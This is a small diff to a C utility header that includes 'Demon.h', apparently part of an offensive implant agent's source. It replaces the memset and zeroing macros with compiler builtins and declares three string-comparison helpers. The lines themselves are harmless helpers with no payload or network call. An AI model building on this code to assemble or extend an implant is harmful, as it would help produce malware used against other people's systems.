@@ -4,8 +4,8 @@
 #include <Demon.h>
 
 #define MemCopy         __builtin_memcpy
-#define MemSet          __stosb
-#define MemZero( p, l ) __stosb( p, 0, l )
+#define MemSet(d, v, l) __builtin_memset(d, v, l)
+#define MemZero(p, l)   __builtin_memset(p, 0, l)
 #define NO_INLINE       __attribute__ ((noinline))
 
 INT     StringCompareA( LPCSTR String1, LPCSTR String2 );
@@ -27,5 +27,9 @@ BYTE    HideChar( BYTE C );
 
 SIZE_T  WCharStringToCharString( PCHAR Destination, PWCHAR Source, SIZE_T MaximumAllowed );
 SIZE_T  CharStringToWCharString( PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed );
+
+BOOL StringEndWithW(LPCWSTR str, LPCWSTR suffix);
+INT StringCompareIW(LPCWSTR String1, LPCWSTR String2);
+int NameCompare(PBUFFER a, PBUFFER b);
 
 #endif
